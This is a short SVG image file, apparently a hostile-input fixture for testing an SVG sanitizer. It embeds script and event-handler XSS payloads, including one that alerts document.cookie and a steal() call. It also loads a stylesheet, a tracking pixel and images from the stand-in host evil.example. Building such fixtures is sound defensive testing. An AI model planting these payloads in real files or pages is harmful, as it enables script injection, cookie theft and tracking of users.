<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="120" viewBox="0 0 200 120" onload="alert('xss')">
  <title>File ostile</title>
  <script>alert(document.cookie)</script>
  <style>
    @import url("https://evil.example/steal.css");
    @keyframes spin { to { transform: rotate(360deg) } }
    .a { fill: #e11d48 }
    .b { fill: url(http://evil.example/p.svg#x) }
  </style>
  <defs>
    <filter id="blur"><feGaussianBlur stdDeviation="4"/></filter>
    <clipPath id="clip"><rect x="0" y="0" width="60" height="60"/></clipPath>
    <mask id="m"><rect width="200" height="120" fill="white"/></mask>
    <pattern id="dots" width="8" height="8" patternUnits="userSpaceOnUse"><circle cx="4" cy="4" r="2" fill="#000"/></pattern>
  </defs>
  <foreignObject x="0" y="0" width="200" height="120"><div xmlns="http://www.w3.org/1999/xhtml"><img src="https://evil.example/pixel.gif"/><script>steal()</script></div></foreignObject>
  <image x="0" y="0" width="40" height="40" xlink:href="https://evil.example/tracker.png" onerror="alert(1)"/>
